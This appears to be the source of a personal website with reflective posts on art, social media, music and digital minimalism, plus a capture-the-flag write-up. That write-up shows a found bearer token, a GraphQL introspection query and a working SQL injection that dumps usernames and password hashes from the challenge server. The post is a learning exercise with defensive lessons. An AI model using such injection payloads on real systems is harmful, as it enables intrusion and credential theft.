> "Make a lot of junk, sort through the junk, pull out the pieces that feel like you - the work that makes you smile, makes you proud, and gets your creative juices flowing to make more. Toss everything else." - Danielle Krysa
2 Social media
& I've gone back and forth on whether or not I should try to create a social media presence for art. Instagram is pretty much the go to place for art, and while it's great for finding inspiration, it can be demoralizing and posting can feel like you're flinging things into the void. Algorithms make it increasingly difficult to build an audience unless you play by their rules, which at the moment is pretty much that you need to make reels or you won't show up for anyone. That is a lot of overhead that doesn't feel worth the effort.
& This quote feels a relevant reminder:
> "It's more important to develop as an artist than grow your following" - Mike Lowrey
& It's easy to get caught up in how good everyone else is, and then compare your own art, disregarding all the time and practice that went into getting others to that point.
> Comparison is the thief of joy
& I don't think sharing on social media is good for me. I don't really need to monetize my art, and I don't need some huge following. I just want to make art. I want to accept that art is valid, even if nobody ever sees it aside from myself.
& I wrote this down but I didn't attribute it for some reason:
> Even if your art never earns money, it will still be a valuable and integral part of your life.
& I feel like this also goes for people seeing it. Even if nobody ever sees your art, it's still valid.
& A while back I joined a Discord for sharing art, and that feels like a less toxic place to share so it's not all just kept away from the world, without feeling like I need to cater to an audience. It's very low key there.
2 Observation
& One of my goals that has emerged lately is to use art to explore my world. I like the idea of seeking out things I don't normally notice, things I like, things that catch my eye, and draw them. This could be in the form of urban sketching, nature journaling, or anything else that helps me experience and process the world around me.
2 Final thoughts
& This is my rough plan for my art practice:
- Get to a point of making some sort of art every day
- Make what feels right, not what you think others will like
- Stay off Instagram
- Experiment
- Make a lot of junk, it's okay
~writing/identity : Identity : Thoughts on identity and how interests relate : 2023-03-08
1 Identity
_ 2023.03.08
& Something a lot of people do is take their interests or their skills and define themselves with it:
> I am a software engineer<br>I am an artist<br>I am a writer<br>I am a hacker<br>I am a musician<br>etc
& I don't feel like I'm disciplined enough in any of my many interests to call myself by it's title. I've tried over and over to make an interest my identity. I go through moods where I think I need to set up an instagram and build up fame as an artist or create a pseudonym and learn to be a bug bounty hunter or start making chiptune music, along with many other interests. This never works out, burns me out, and I get nowhere.
_ Rinse and repeat.
& Usually when I dive into one of these interests, I spend more time trying to define the identity as opposed to actually creating something.
& Instead of defining my identity with one of these things, I'm instead going to define myself like this:
* I am me. I am curious.
& I don't need to redefine myself and set up these new identities. I already have an identity, and it's me and my curiousity. I've always been incredibly curious about a wide array of things. Curiosity has been the one consistent thing.
& I will no longer allow this cycle to happen, and instead simply follow my curiosity and share the results here. This will allow me to focus evenly on everything I'm interested in, spend time on something when I'm motivated for that particular interest, and not burn myself out obsessing over creating new identites.

~writing/on-music : On Music : Thoughts on my relationship with music : 2023-01-12
1 On Music
_ 2023.01.12
& As with a lot of people, music was a really important part of my middle school and high school years. Since I grew up in the beginning of the rise of music discovery on the internet, I spent a lot of time poking around, discovering new artists.
_ That is something I miss.
& With the rise of streaming services like Spotify, I feel my relationship to music has diminished. I no longer go out and find what I like, I just put on a playlist curated by someone else, and couldn't even name more than one or two artists that I listen to regularly, if any at all.
& I plan to expend some effort in 2023 to build a close relationship with the music I listen to again.
& I am going to use my old [b:7th Generation iPod Classic] again. I installed [l:https://www.rockbox.org|Rockbox] on it a while back, and manage my music on it via [l:https://www.getmusicbee.com|MusicBee]. I am going to try to use my iPod over Spotify whenever I can. If I find I don't have something I want to listen to, I will buy it to support the artists.
& I have a wishlist of albumns on BandCamp I'd like to buy, and I will be using whatever resources I can online for new artist discovery. Taking the time to discover, purchase, and transfer the music to my iPod will make me feel much closer to the music and the artist. I will always puchase the music where I can get it DRM free and where the most money goes to the artist.
& I also want to select individual albums or artists to listen to as opposed to just putting a huge playlist on shuffle. I want to pick what feels right for the mood I'm in. I will also curate my own playlists instead of relying on others.
& When at work I will probably just listen to some of my favorite online radio stations, and if I hear something I like I'll take note of the artist and look into them later. Here are my favorite online stations/sites:
- [l:https://radio.garden/|Radio Garden] I use this to listen to radio stations from Japan or Hawaii
- [l:https://jetsetradio.live/|Jet Set Radio LIVE] The JSR soundtrack + other similar music
- [l:https://jetsetradiofuture.live/|Jet Set Radio Future LIVE], The JSRF soundtrack + other similar music
- [l:https://tilderadio.org/|tilderadio] A tildeverse radio station with various volunteer DJs
- [l:https://somafm.com/player/#/now-playing/defcon|DEF CON Radio] The SomaFM station for DEF CON
- [l:https://www.lofi.cafe/|lofi.cafe] Various lofi stations
- [l:https://mindmelt.party/|MINDMELT] Music visualizer with various electronic music stations

~writing/mastodon : Returning to Mastodon : Thoughts on my return to Mastodon : 2022-11-29
1 Returning to Mastodon
_ 2022.11.29
& A while back I decided to limit the amount of social media I was using, including Mastodon. I didn't like the way it made me feel and the way it distracted me from everything else in my life.
& I have recently made the decision to get back on Mastodon in a small local community with people I know IRL. As per my personal philosophy on technology, I am going to be mindful of my usage, which will include:
- Not having it installed on my phone, so I can intentionally open up my laptop to go check my feed
- Being mindful of who I'm following to minimize unnecessary feed bloat
- Staying out of the global feed as it's a huge time suck
- Being on a small instance with people I know to get the most out of the local feed
& Since leaving Mastodon, I used [l:projects/mastofeed|mastofeed] and [l:writing/rss|RSS] to follow people who's work and thoughts I care to keep up on, however I often wanted to comment on the posts but had no way to, so I will be happy to be able to do that again.
& I will mostly be posting updates to my website and projects I'm working on.
& If you want to follow me I'm at [l:https://mastodon.spotek.io/@dustin|@dustin@mastodon.spotek.io]
& I am also on [l:https://toki.social/@0xdstn|toki.social], to immerse myself in toki pona for learning purposes.

~writing/mindful-eating : Mindful Eating : Thoughts and personal experience with eating mindfully : 2022-09-07
1 Mindful Eating 
_ 2022.09.07
& Mindful eating is something that has been challenging for me, but I find a lot of benefits in it.
& I realized that I tend to queue up a new bite while still chewing the last one. This feels like I am just trying to consume all the food as fast as possible, not paying attention to the bite I'm eating. My solution to this is to take a bite, then set down my fork until it's gone and I'm ready to take another bite. Doing this allows me to fully experience and enjoy the food, be aware of how full I am, and be more present in the moment, as opposed to passively eating. At the end of my meal, I also don't clear the dishes until I've finished my final bite.
& Like a lot of people, I tend to read or use my phone while eating. This causes me to be unaware of the food that I am eating, and not something I want, so I no longer allow myself to have any sort of media during meals. I want to only consume food, not external things. This helps me be present and focused.
& When eating alone, I treat it like a meditation. I don't want to spend the time thinking about other things. Instead I choose to focus on the flavors, textures, and smells of the food. I also take some of the time thinking about being grateful for the food and where it came from. I think about where it came from or the person that prepared it. I think about the plants, animals, and/or people involved in producing the ingredients, and thank them for their had work or sacrifice so that I can be nourished.

~writing/hackers : Hackers : Thoughts on being a hacker : 2022-07-19
1 Hackers
_ 2022.07.19
& I have always viewed the title "hacker" to require a certain level of skill to claim. I'm realizing that this view is simply wrong. Being a hacker has nothing to do with skills. It has to do with having the hacker mindset.
& Not accepting things (systems, technology, etc) as they are, but instead view them as something to be tinkered with and modified. To take things, figure out their limits, and push them. To turn something into what you need, not just take what you're given as is.
& I have always had this  hacker mindset. Since I was young I've taken things apart to figure out how they work and put them back together. I've always taken technology, and pushed their limits to best suit my needs.
& You don't have to know how to break into computer systems or any other specific skill like that. You just have to be curious, never accept things as they are, and never stop learning.
* I am a hacker.

~writing/writing : On Writing : Thoughts on being a writer : 2022-07-13
1 On writing
_ 2022.07.13
& I would like to be a writer. Not necessarily a published writer, but just a writer. I want to write for myself, write here on this site, and write daily in [l:https://tilde.town/~dustin/suno|Suno] and let it disappear.
& I have always had this feeling that I am not a good writer. Even if I'm not, I'm not trying to get published, I just want to write. It doesn't have to be good. I think the process of writing itself is what I'm really going for. It can be meditative and open myself up for more reflection.
& On the other hand, if I don't write, I don't think about things. I just coast through the days without any reflection on what is going on in my life. I want to get to a point where I'm putting what I'm experiencing and feeling in words, and reflecting on it.
& Probably most of what I write won't end up on this site, or even in my notebook. I'll probably do morning pages in Suno, and if anything feels like it belongs in my notebook or on this site, I'll move it over. That's how this post started.
& It feels far-fetched, but it's also possible that as I work through my feelings of inadequacy, I may find myself to be decent at writing and then want to actually write something to get published. If that happens or if that doesn't happen, either way is good.

~writing/digital-minimalism : Digital Minimalism : My personal relationship with technology : 2022-02-25
1 Digital Minimalism
_ 2022.02.25
& I've listed my [l:wiki/philosophy#Technology|personal philosophy on technology] already, but I decided I'd like to write a post specifically on digital minimalism.
& In 2020 I read the book [l:https://www.amazon.com/dp/B07DBRBP7G|Digital Minimalism] by Cal Newport. That book defined a lot of my current views on technology, which is almost the complete opposite of my previous relationship with technology. I should note that while I hold these specific views, sticking to them is not easy. I get easily distracted and addicted to technology, as a lot of us do, and that is what I'm trying to stay away from.
& The biggest takeaway from that book is that I want to be [i:intentional] with my use of technology. I tend to get sucked in to a whirlwind of digital activities, and I am working to put boundaries in place, both mental and digital, to prevent those kinds of behaviors.
2 Digital limitations
& One thing I have done is uninstalled specific applications and even blocked certain sites on my phone. I don't want to use my phone to escape, or really even for entertainment. I view my phone as a tool. It's for playing music, viewing my calendar, setting alarms, getting directions, ordering coffee, etc. I want my phone to be a purely utilitarian device.
& I have decided to leave certain social apps on my phone, as they are challenging to use on other devices, but I don't allow myself to open them when I'm bored. I need to have a purpose going into them (like posting something).
& I have also blocked my Mastodon instances in firefox on mobile using [l:https://addons.mozilla.org/en-US/firefox/addon/leechblock-ng/|LeechBlock NG]. Those are not sites I want to just visit when I'm bored. I want to go into them intending to spend some time browsing them and/or posting something. These are activities I can do intentionally on my laptop.
2 Mental limitations
& Digital limitations can only do so much. There also needs to be mental limitations in place. This can be challenging to keep up, but having rules in place for yourself is helpful in keeping focused.
& One time suck that I struggle with is the explore tab on Instagram. It's really good at showing curated posts that align with your interests, and I need to stay away from that, as I tend to just sit there and scroll for a very long time. My mental rule for this is simple: I'm never allowed to open the explore tab. Ever. For any reason. This habit can be difficult to break, but it prevents me from doing something mentally destructive that gives me nothing in return.
& Another thing I have been doing is not allowing myself to do distracting things on my work computer. I struggle with focusing on work, and can easily get caught up in something for hours and realize I've done nothing productive that day. Distracting activities either need to never be done, or done intentionally on my personal computer after work hours.
2 Accepting technology
& Another mindset I got from the book is to not accept technology as it is. You need to assess a piece of technology and determine if it aligns with your personal goals. If it is useful, but it has all these other distracting features, can you turn those off? Can you make a rule for yourself to never use them? Can you find an alternative that is more dialed in to what you're trying to achieve? Can you build an alternative yourself?
& It's fortunate that I'm a software engineer, so I can write my own programs if needed. I've made many different things for myself that fit specific needs, as opposed to just using something off the shelf that is [i:close enough].
2 Final thoughts
& Overall the intent here is to do the following:
- Use technology intentionally
- Build up digital and mental limitations to support your goals 
- Don't accept things as they are, make technology work for you, not against you

~writing/reminders : Reminders : How my own words give me future advice : 2021-10-15
1 Reminders 
_ 2021.10.15
& I have written on this website about various personal struggles I've had with staying [l:writing/focus|focused] and [l:writing/social|social media]. The things documented in those articles are recurring issues I can't seem to completely get away from. They always come back.
& There is one thing that is different now - I have my written thoughts on the matters, when I was in a much better headspace, available to read when I am struggling. This has been hugely beneficial, and I'm glad I have it, and that I am thinking of re-reading them whenever things start to go south.
& It has prevented me from going down rabbit holes I know will just exhaust me, and going and setting up new identities online. It's like having past me travel to the future and remind me not to mess things up, and I appreciate that I provided this for myself.
& I'm going to keep doing these things, and I'm going to write them here again as a reminder:
- Focus on reading and painting as hobbies
- Stay away from social media as much as possible
- Be intentional with your use of technology
- Don't get caught up in the many enticing rabbit holes
- You've got this :)

~writing/focus : Focus : Thoughts on what I choose to focus on : 2021-07-28
1 Focus
_ 2021.07.28
& My mind is scattered. I shift between what I want to focus on on a monthly, sometimes even weekly, basis. It's a problem that I struggle with and it is not ideal.
& I can pretty much forecast how my focus will shift at this point. At the very leas, every few months, and definitely just before Defcon each year, I get interested in doing bug bounties ([l:https://bugcrowd.com|BugCrowd], [l:https://hackerone.com|HackerOne]). I will get interested in security and appsec, and let it the obsession take over my responsibilities and life.
& There is usually a desire for the large bug payouts and the fame that can come with this. I find the hacker culture, in general, very enticing.
& I don't actually have enough skills to properly bug hunt, yet I never make time to study and practice. Because of this, I just spin my wheels (usually while neglecting my job or my family), then come out of it in an exhausted daze. There is a specific way I feel after trying to make something work over and over only to not succeed, and I don't like it. That is what bug hunting would always be like, even if I got good enough to do it properly.
& I realized yesterday (after doing this) that something I like about bug hunting, aside from the possibility of getting paid or recognition, is that it's basically a puzzle to solve. The problem is, most of the time there is no way to solve the puzzle. Often there are no bugs where you are searching. That can be very frustrating.
& Whenever I think about why I am interested in doing this, these are usually my reasons:
- Hacking is fun/interesting
- Potential to make a lot of money
- Potential to reach a certain level of fame
& The problem with these reasons, is I don't [i:need] the money because I have a decent paying job, and I definitely don't need the fame. This reminds me of Marcus Aurelius' view of fame - we will all be dead and forgotten soon, so why strive for fame?
& That leaves the fact that I find hacking fun/interesting. I think the challenge/puzzle of it is what I really enjoy, which leads me to believe that I would feel just as happy working on a challenging puzzle (like the [l:https://hackmd.io/@tux0/goldbug2020|Gold Bug puzzle] from the [l:https://cryptovillage.org|Crypto &amp; Privacy village] at Defcon). It has a solution, so I wouldn't feel I was just spinning my wheels, and at the same time it has nothing to do with money or fame - it's just something I want to do because I enjoy it.
& Another thought I had on this was giving myself a question to answer - [b:Would I want to do this if I were retired?] The answer to that is no. If I was retired and didn't have to worry about money or really computers at all anymore, I would not be interested in this. I would be spending time with my family, painting, and reading. That answer tells me exactly where I should direct my focus.
* A note to my future self if I go down this rabbit hole again:
& It isn't worth it. There are not enough benefits to outweigh how it makes you feel, and it isn't where your priorities should lie. If you must do something, find a puzzle/challenge with a real solution and solve that. Even write up how you got there if you want to share it with others.
& You should focus on the things that matter:
- Family
- Painting
- Reading
& Don't do this to yourself again.

~writing/rss : RSS Feed : Notice of an RSS feed added to this site : 2021-04-22
1 RSS Feed
_ 2021.04.22
& I wrote in my [l:writing/social|thoughts on social media] how I am now using RSS feeds to keep up on the work of people I want to follow, and that if they do not have an RSS feed, I won't be keeping up on them, and that's fine.
& This was somewhat ironic considering I didn't have an RSS feed of my own.
& I have now added an [l:index.xml|RSS feed] that gets generated with my custom python script that creates the site. It will now update every time I publish something new. It was fun figuring out how to craft the XML for a feed.
& If you like my work, you can follow me with an RSS reader.

~writing/withdrawal : Social Media Withdrawal : Stream of thought during a social media withdrawal : 2021-04-15
1 Social Media Withdrawal
_ 2021.04.15
& I'm already feeling social media withdrawal. It's only been a couple weeks, if that. I'm used to scrolling through Instagram and Mastodon.
& It feels like I'm missing out. That I could be interacting with like-minded people and I'm not.
& The silly thing is I normally don't really interact with people on social media, I just browse, giving me that hit of dopamine my body is craving.
& Instead of going and making an account somewhere, I'm writing here. Maybe nobody will read this, maybe someone will, who knows. This is more for me.
& I want to spend time writing, thinking, and creating, not scrolling mindlessly.
& I often feel like I'm missing out on information. There are [i:things] out there being created that I'm not seeing. The truth is I hardly see anything that I couldn't have lived without.
& I will probably go read some things from my RSS feeds. That should help. This seems to have helped too.

~writing/social : On Social Media : Thoughts on the dangers of social media : 2021-04-13
1 On Social Media
_ 2021.04.13
& I've had a complicated relationship with social media over the years. In the early days, I was actively trying to get an account on [i:every] platform I could find. I loved having a list of every service I had an account for on my personal website. After years of trying to keep up with everything, I'm now moving in the opposite direction.
& Social media has gotten worse and worse over the last decade, as far as mental impact goes. It's exhausting for most people. We weren't meant to keep up with so much information all of the time. It's just too much for our brains to manage.
& For me, even simpler, less exhausting social media doesn't do me good. I ditched Twitter and various other big social networks a long time ago, and started using smaller communities through Mastodon.
& Now that I was consuming a manageable amount of information, and mostly positive at that, I uncovered my new issue.
& I am easily swayed by the things I consume. If I'm reading posts about things people are doing, I will become obsessed with whatever topic that is for a while, until something new shifts my focus. This means that every day I could be getting pulled in a new direction, which is time consuming and exhausting.
& Because of all of my failed attempts at using Mastodon and other social media, I'm now shying away from it all. I've deleted my Mastodon account and will not make another one (I've had a lot of accounts on various instances over the years).
& My choice now is to organically find things that pique my interest. This is a lot more manageable and less likely to cause me to switch what I'm doing constantly.
& I will be writing my thoughts and documenting my projects on this site, and that will be it. If someone wants to contact me, they can use my [l:mailto:0xdstn@protonmail.com|email]. There is no other way to send me a message. I imagine this will cause me to get nearly nobody reaching out to me, and that's okay. If someone finds it worth their time to click my email link and write something to me, that means to me that they really care about that communication. It will be a nice gesture if it happens, and it will not be missed if it does not.
& I am also choosing to follow some people who's work I like and want to keep up on via an RSS reader. If someone doesn't have a feed, I won't have a way to follow what they're doing, and that's okay.
& I will be using an offline RSS reader on my personal laptop, so I can't be tempted to refresh it over and over via my phone or my work computer. I only want to look at my feed when I'm  devoting uninterrupted time to it.
& As per my [l:wiki/philosophy/#Technology|personal philosophy regarding technology] I will be using the internet [i:intentionally].
& If you are out there reading this and would like to say hi, I'm always available via [l:mailto:0xdstn@protonmail.com|email]. I'd be glad to discuss any shared interest we may have :)

~writing/2020 : 2020 Review : A retrospect of the year 2020 : 2020-12-31
1 2020 Review
_ 2020.12.31
& As we all know, this has been a crazy year. I figured I'd write down some reflections on it as we move into 2021.
# [l:#Challenges|Challenges]
# [l:#Personal growth|Personal growth]
# [l:#Gratitude|Gratitude]
# [l:#Changes|Changes]
# [l:#Reading|Reading]
# [l:#2021|2021]
2 Challenges
& Aside from the [b:COVID-19 pandemic], I faced additional challenges that I was not prepared for. In January, we ended up unexpectedly taking in two more children, bringing our total up to four. It was intended to be a temporary thing, 90 days max. They are still with us today, with no real end in sight.
& Learning to parent children you didn't bring into this world, coming in with their own issues and traumas is challenging. This has tested me as a parent like nothing else. I never realized how much more difficult it could be.
& On top of that, we all ended up doing school and work at home for a long time. I'm still working from home since March, and in-person schooling just started back up. You really grow together and simultaneously clash in an environment like this. It takes some getting used to, but it lends itself to much personal growth.
2 Personal growth
& Due to the unique challenges I've faced this year, I feel I have made a ton of personal growth. I was forced into situations that made it necessary to look inward, and learn.
& Since summer, I have been doing therapy, which I avoided for years, always using some excuse. This was one of the best decisions I have ever made. It has really allowed me to learn about myself, work on myself, and be more self aware.
& Through all of this, I have become closer to my wife than we have ever been, and I feel like I'm learning to be a better parent (though I have a lot more to learn).
& Even with all of the difficulties, I feel happier with myself than I've felt in a long time.
2 Gratitude
& It may be odd, but I am grateful for the pandemic. It pushed me to be a better version of myself. I had no choice but to grow, or it would have been incredibly more difficult.
& I am also very grateful that it did not impact my job, as it has for so many. I can continue working from home, and I don't have to worry about our financial state.
& I'm grateful for my wife for pushing me to seek help in the form of therapy. Without her encouragement, I wouldn't be who I am today. Who I am today is not who I was at the beginning of the year.
2 Changes
& I made some changes in my life this year, primarily rules I put on myself, allowing me to be less stressed and overall better.
- Self imposed [b:digital minimalism] restrictions
- Utilizing the [b:Love and Logic] parenting style
- Learned a lot of about [b:diversity and inclusion], and becoming aware of my own privilege
- Started [b:self reflecting] in my bullet journal
2 Reading
& I set out with a goal of reading 15 books this year, and I ended up reading 38. That was highly unexpected for myself.
& Even if you don't include the comics or very short books, I still surpassed my goal. I'm proud of myself for this, as I never used to be much of a reader prior to 2019.
& My goal for next year is going to be 20 books, as I'll probably read more normal length books.
& I want to primarily focus on nature and philosophy books, with a few fiction books here and there.
& While I've set this goal, I'm also going to try to not obsess over the number, as I've done that before. If I don't hit it, or I surpass it, what really matters is what I get out of the books.
& My favorite books this year were:
- [l:https://www.amazon.com/dp/B000FC1JAI|Meditations] by Marcus Aurelius, Gregory Hays
- [l:https://www.amazon.com/dp/B07DBRBP7G|Digital Minimalism] by Cal Newport
- [l:https://www.amazon.com/dp/B00IV351R0|Parenting With Love and Logic] by Foster Cline, Jim Fay
- [l:https://www.amazon.com/dp/B07MPYX96Y|Better Allies] by Karen Catlin
- [l:https://www.amazon.com/dp/B08DFHBWKV|No Longer Human] by Osamu Dazai
- [l:https://www.gutenberg.org/ebooks/520|The Life and Adventures of Santa Claus] by L. Frank Baum
2 2021
& Moving into [b:2021] I'd like to work on the following:
- Create a solid [b:morning routine] 
- Start and stick to a [b:daily meditation] habit
- [b:Write/reflect] nearly every day
- Be [b:less strict] with myself and others
- Take the time to [b:paint/sketch] more
- Use my [b:phone] for [b:less than an hour a day]

1 2020 Bugcrowd Graphiqal CTF Write-up
_ 2020.07.21
* [c:UPDATE 2021.04.13] It seems Bugcrowd has taken down this CTF, so the links will not work any longer. I will leave them as they were, as I don't have anything better to change them to.
& I have been interested in [b:appsec] for a long time, but never really took the time to study it or to practice it. I have recently started focusing my time on it, and decided to try my hand at [l:https://bugcrowd.com|Bugcrowd]'s beginner CTF, [l:https://bgcd.co/GRAPHIQALCTF|Graphiqal].

# [l:#Flag #3|Flag #3]
# [l:#Takeaways|Takeaways]
2 Scoping out the landscape
& The first thing I did was manually scope out the site, to see what was there. I found the following:
- [b:API (/api)] - displays a message saying they moved to [b:graphql]
- [b:Gogs (:3000)] - a [b:gogs] instance with some source code
2 Flag #1
& I manually browsed the source code in the repository, as there wasn't much. Eventually I found [l:http://164.90.156.83:3000/maxim/graphiqal-ant/commit/be4aa476e3241298408fa48d1b8216bd2c5b3fc4|this commit] which contained the first flag: [c:FLAG{9e233d7662f4fe8f0e6eaee08b1e1dd8}].
& In hindsight I realized a more efficient use of my time would have been to download each of the repositories and run [c:ack "FLAG"] which also would have given me this flag.
2 Flag #2
& After finding that one fairly quickly I decided to take a look at [b:graphql] since it was mentioned on the [b:/api] page.
& A common endpoint for graphql is [c:/graphql]. I made a request to that and received the following response:
% $ http http://164.90.156.83/graphql
% HTTP/1.1 401 Unauthorized
% 
% Missing Bearer Token
& Since I needed a bearer token, I decided to search through the repositories again to see if I could find a secret I could use to generate a token. I then stumbled upon a [l:http://164.90.156.83:3000/maxim/new-painting-checker/src/master/retrieve.py|cleartext token]. Even better.
& I made a request, passing the token as a header and got a response letting me know it worked:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d"
% HTTP/1.1 400 Bad Request
% 
% {
%   "errors": [
%     {
%         "message": "Must provide query string."
%     }
%   ]
% }
& Since I was now able to make graphql requests, I searched for a query that I could use to get a list of all the available graphtypes. I found [l:https://stackoverflow.com/questions/37397886/get-graphql-whole-schema-query|this stackoverflow question] which provided an introspection query to get the schema information. After some trial and error I ended up with this request:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {__schema{queryType{name}types{name fields(includeDeprecated: true) { name description isDeprecated deprecationReason }}}}"

%                             "description": null,
%                             "isDeprecated": false,
%                             "name": "genre"
%                         },

%                         }
%                     ],

%           ]
%           ...
%         }

& It seemed the only graphtype I could use was [b:Paintings] so I made a request to fetch all of those:

& And there we have it, flag #2: [c:FLAG{b5c009704caf8d0575cbc801a97ae49b}]
2 Flag #3
& This one gave me a lot of troubles. I didn't know where to start, as I had exhausted all of the ideas I had from my initial investigation of the landscape. I poked around more in the repositories trying to find any sort of credentials I could use. There were some local SQL credentials, however port 3306 was not open on the server.
& I had no idea how much more difficult this flag would be, and ended up going down the wrong path. I had decided there may be a documented vulnerability with the version of gogs they were running. I tried many different POCs for vulnerabilities related to gogs, all with no luck. I even tried using a script called [l:https://github.com/TheZ3ro/gogsownz|gogsownz]. Nothing was working.
& I was certain I was on the right track, because there was a reference to a file in the repo: [c:/tmp/testing/pwned777.txt], I figured I needed to use a [b:Path Traversal] attack to find out what was in that file.
& After a lot of effort I went into the [l:https://discord.com/invite/TWr3Brs|Bugcrowd Discord] and asked how much more difficult the third flag was from the second. While looking in there I also noticed someone said there wasn't any vulnerable software, as far as they knew, so that would indicate that this was the wrong path to be going down.
& There was then a hint posted
> [b:mqt:] think of from where the API is pulling the data and what vulnerabilities can arise from this
& I was then thinking about how I saw those SQL credentials, and how graphql would use some sort of database technology. I then started researching how to do [b:SQL Injection] via [b:graphql] queries. It turned out that I could use the [b:painting] request where you pass an ID to get a single painting, and inject some SQL into it. This ended up working, and after some playing around I came up with this query:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {painting(id:\"' UNION SELECT id, GROUP_CONCAT(password),GROUP_CONCAT(username),null,null FROM users #\"){id name artist}}"
% HTTP/1.1 200 OK
% 
% {
%     "data": {
%         "painting": {
%             "artist": "maxim,hadi,FLAG",
%             "id": "1",
%             "name": "29d79648ac14a5d8d0268867bd3161c6,bc8a5e6ccfb6c15b61d6d218c2df6cca,FLAG{2f55138f7dce2e3e852f1c8a487b33f9}"
%         }
%     }
% }
& There it was, the third flag as a password of the user FLAG: [c:FLAG{2f55138f7dce2e3e852f1c8a487b33f9]
2 Takeaways
& This CTF provided multiple attack vectors that should be considered when writing software:
3 Flag 1
- Don't leave sensitive information in git repositories
3 Flag 2
- Don't leave secrets or tokens in git repositories
- Don't allow introspection queries in graphql
3 Flag 3
- Sanitize your inputs to prevent SQL injection
2 Final notes
& While I started going in the wrong direction, and I ended up using a hint, overall I consider this a success and I had a ton of fun participating. I'm going to continue to try my hand at other challenges. Thanks for reading!

~art/waterfowl : Waterfowl : Sketches of some waterfowl at Riverfront Park : 2023-02-09
1 Waterfowl
_ 2023.02.09
@ |assets/img/waterfowl.jpg
& I took a walk down to Riverfront Park during lunch to see if I could find some birds to sketch. I quickly found 3 [b:Canada Geese], a [b:Mallard] and 7 [b:American Wigeons].
& I took some photos and sat down to start sketching. Two of the geese were grazing in the grass while the other one kept watch. Eventually the two came within a foot of me. After a bit, the watcher came over and lowly hissed at me until I got nervous and left. It must have decided I was a threat.
& The mallard was swimming in the group of wigeons. They didn't seem to mind.
& It was nice getting out, seeing some birds, and sketching a bit. Watercolor takes a while to dry in the cold, so you have to wait a bit longer than you'd expect between coats of paint.

~art/7day-challenge-2022 : 7 Day Challenge 2022 : A challenge I did in October 2022 : 2023-02-09
1 7 Day Challenge 2022
& In October 2022 one of my favorite artists [l:https://www.instagram.com/sdionbakerdesign/|Samantha Dion Baker] set up a 7-day challenge where each day you draw a specific time of a typical day for you. Posts for it can be seen on Instagram with the hashtag [l:https://www.instagram.com/explore/tags/samanthaandohnmar7day/|#samanthaandohnmar7day].
& These were my drawings for this challenge. It's the only art challenge I've ever finished, and I'm proud of how these turned out!
2 7 AM: Making breakfast for the kids
& I was shocked at how well my strawberries turned out. I'd never drawn one before and I was really proud of it.

2 9 AM: Coffee
& I've drawn this mug many times as it was my favorite. Unfortunately it fell off a counter and broke after I drew this, and they no longer sell them since it was a limited edition mug from artist [l:https://www.instagram.com/nathanielrussell|Nathaniel Russell]. It will be missed.

2 12 PM: Breakfast
& Since I was doing intermittent fasting, I usually wouldn't eat until about 12, which is why this was so late in my day. This is my least favorite of this set.
@ |assets/img/03-12PM.jpg
2 2 PM: Working
& Since I was posting these on Instagram at the time, I started changing up how I took photos so they were angled and showing art supplies, which is the kind of things that get more likes.

2 5 PM: Cooking dinner
& This one almost doesn't look to me like something I did. It feels very different from my usual drawings, and I also like it a lot.

2 10 PM: Reading
& Of all the time texts at the top, this is my favorite. I really like the purple that I chose for it.

~thoughts/self-hosting : Self Hosting : Self Hosting : 2023-08-28
1 Self hosting
_ 2023.08.29
& I'm considering buying a domain and self hosting my site. I'd just run it on a [b:Raspbery Pi 3 Model B+]. I've done this before, so I know what needs to happen to set it up.
& I'd then also consider hosting the following:
- A gemini site
- A gopher site
- A Tor site
& I love tilde.town, but I think there is also something enjoyable about managing my own hosting.
& I am curious how that would affect people who currently follow me via RSS, or have my website bookmarked/linked to from their site.
& I imagine I could replace page contents with a message that says "This page has been moved to x" with a link to the same page on my new site, and put in a javascript redirect as well so it can redirect automatically.
& I'd then likely post to my blog on the old site saying the site has moved with the new URL, which would also get picked up in people's RSS feeds so they can know to update their entry for my site.
& If you follow me or have bookmarks/links to my site, I'd love to hear your opinion on a switch like this. Feel free to send me an [l:mailto:0xdstn@protonmail.com|email].
